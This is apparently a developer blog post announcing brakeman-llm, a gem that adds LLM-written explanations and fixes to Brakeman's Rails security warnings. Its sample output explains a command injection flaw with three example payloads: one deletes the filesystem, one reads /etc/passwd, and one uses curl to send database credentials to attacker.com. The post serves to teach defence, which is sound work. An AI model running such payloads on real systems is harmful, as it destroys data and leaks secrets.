---
layout: blog
title: "Brakeman-LLM Released"
subtitle: "LLM-powered sprinkles for Brakeman"
date: 2025-08-30
permalink: /blog/:year/:month/:day/:title
---

A long time ago, when Brakeman was first designed, its output was optimized to fit into tables like this, with one warning per line:

```
+------------+----------------+--------------+-------------------+--------+------------------------------------------------------------------------+
| Confidence | Class          | Method       | Warning Type      | CWE ID | Message                                                                |
+------------+----------------+--------------+-------------------+--------+------------------------------------------------------------------------+
| High       | HomeController | test_command | Command Injection | [77]   | Possible command injection near line 34: `ls #{+params[:file_name]+}`  |
| High       | HomeController | test_command | Command Injection | [77]   | Possible command injection near line 36: system(+params[:user_input]+) |
+------------+----------------+--------------+-------------------+--------+------------------------------------------------------------------------+
```

This approach severely limited the "message" that described the warning. Brakeman has largely stuck to this limitation, even though the default output now looks like this:

```
Confidence: High
Category: Command Injection
Check: Execute
Message: Possible command injection
Code: `ls #{params[:file_name]}`
File: app/controllers/home_controller.rb
Line: 34

Confidence: High
Category: Command Injection
Check: Execute
Message: Possible command injection
Code: system(params[:user_input])
File: app/controllers/home_controller.rb
Line: 36
```

From the beginning, Brakeman was intended as tool primarily for _developers_, not security professionals.
However, it's fairly clear that "Possible command injection" isn't enough content for most non-security folks.

Also, wouldn't it be nice if the message used some of the known context about the warning? Like the code involved? And how about recommendations on how to fix the potential security issue??

Historically, this was pretty hard and I didn't have a lot of motivation to build something that complex.

## Brakeman-LLM

The `brakeman-llm` gem extends Brakeman with LLM-generated warning descriptions. 

Under the hood, this is actually pretty simple, but it's been designed to hook into Brakeman as seamlessly as possible.
Once a scan is complete, each warning is sent to an LLM of your choosing with a basic prompt to explain the warning and recommendations for how to fix it.

The quality of the results naturally depend on your LLM, but here is an example using Anthropic Claude:

    Confidence: High
    Category: Command Injection
    Check: Execute
    Code: `ls #{params[:dir]}`
    File: app/controllers/users_controller.rb
    Line: 78
    Message: Possible command injection

    This is a **critical command injection vulnerability** where user-controlled input
    from `params[:dir]` is directly interpolated into a shell command without sanitization or validation.

    ### The Problem

    The code executes:
    ```ruby
    `ls #{params[:dir]}`
    ```

    The backtick operator in Ruby executes shell commands. By directly embedding `params[:dir]` into the
    command string, an attacker can inject arbitrary shell commands. For example, if a malicious user provides:

    - `params[:dir] = "; rm -rf /"` → executes `ls ; rm -rf /` (attempts to delete the filesystem)
    - `params[:dir] = "| cat /etc/passwd"` → executes `ls | cat /etc/passwd` (exposes sensitive files)
    - `params[:dir] = "&& curl attacker.com?data=$(cat config/database.yml)"` → exfiltrates database credentials

    This vulnerability allows complete system compromise with the privileges of the Rails application process.

    ### Fixes

    **1. Avoid shell execution entirely (Recommended)**
    Use Ruby's built-in file system methods instead:
    ```ruby
    Dir.entries(params[:dir])
    # or
    Dir.glob(File.join(params[:dir], '*'))
    ```

    **2. Use array-based command execution**
    If shell commands are necessary, use array syntax to prevent injection:
    ```ruby
    system('ls', params[:dir])
    ```
    This passes `params[:dir]` as a separate argument, preventing shell interpretation of special characters.

    **3. Strict input validation**
    Whitelist allowed values or validate against a strict pattern:
    ```ruby
    dir = params[:dir]
    raise "Invalid directory" unless dir.match?(/\A[a-zA-Z0-9_\-\/]+\z/)
    `ls #{Shellwords.escape(dir)}`
    ```

    **4. Use Shellwords.escape**
    If interpolation is unavoidable:
    ```ruby
    require 'shellwords'
    `ls #{Shellwords.escape(params[:dir])}`
    ```

    ### Best Practice

    Never execute shell commands with user input. The first solution (using Ruby's `Dir` methods) is strongly
    preferred as it eliminates the attack vector entirely. Shell execution should be a last resort and always
    requires careful input sanitization.

    (The above message is auto-generated and may contain errors.)

Note that the description above not only shows how to avoid command injection, it provides better approaches to listing files generally (which is what the original code was doing).

### Usage

Install `brakeman-llm` gem as usual (Gemfile, etc.)

Use `brakeman-llm` to run. All regular Brakeman options should work.

LLM options:

* `--llm-provider` - LLM provider (Ollama, OpenAI, Anthropic, etc. - required)
* `--llm-model` - LLM model name (required)
* `--llm-api-key` - API key for LLM provider (optional, depending on provider)
* `--llm-api-base` - The URL to use For Ollama and other alternative providers

See the [Brakeman-LLM documentation](https://github.com/presidentbeef/brakeman-llm?tab=readme-ov-file#) for more options
and information on configuration.

#### Example Commands

Using Ollama locally:

`brakeman-llm --llm-provider ollama --llm-model gemma3:4b --llm-api-base http://localhost:11434/v1`

Using Anthropic Claude:

`brakeman-llm --llm-provider anthropic --llm-model claude-sonnet-4-5 --llm-api-key YOUR_CLAUDE_API_KEY`

### How It Works

Brakeman-LLM provides a wrapper combining Brakeman and [RubyLLM](https://rubyllm.com/).

After the Brakeman scan runs, the LLM provider is invoked for each warning with a basic prompt requesting analysis and remediation.
The LLM is provided the warning in JSON and additional information about the warning type.

A disclaimer will be appended to the LLM output. This disclaimer may be configured or removed using `--llm-disclaimer`.

For text reports, the result from the LLM will be appended to the warning message.
For JSON reports, the result will be added as a new key called `llm_analysis`.

The instructions and prompt for the LLM can be adjusted as desired.

Brakeman 7.1.1 added word wrapping for text output when using the default pager, which makes
the long explanations from the LLM more legible.

## Reporting Issues

Please report any [issues](https://github.com/presidentbeef/brakeman-llm/issues) or suggestions!
